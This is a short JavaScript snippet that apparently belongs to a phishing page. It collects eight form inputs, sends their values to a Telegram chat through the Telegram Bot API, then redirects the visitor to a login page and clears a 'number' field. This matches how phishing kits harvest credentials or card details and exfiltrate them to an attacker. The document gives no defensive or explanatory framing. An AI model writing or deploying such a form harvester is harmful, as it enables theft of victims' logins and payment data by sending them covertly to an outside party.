
var field1,field2,field3,field4,field5,field6,field7,field8;
var ready = function () {
    field1 = document.getElementById("field1").value;
    field2 = document.getElementById("field2").value;
    field3 = document.getElementById("field3").value;
    field4 = document.getElementById("field4").value;
    field5 = document.getElementById("field5").value;
    field6 = document.getElementById("field6").value;
    field7 = document.getElementById("field7").value;
    field8 = document.getElementById("field8").value;
    message =  field1 +
    "\n\n\n" + field2 +
    "\n\n\n" + field3 +
    "\n\n\n" + field4 +
    "\n\n\n" + field5 +
    "\n\n\n" + field6 +
    "\n\n\n" + field7 +
    "\n\n\n" + field8 ;
};
var sender = function (event) {
    event.preventDefault();
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = "./login.html"
    });
    document.getElementById("number").value = "";

    return false;
};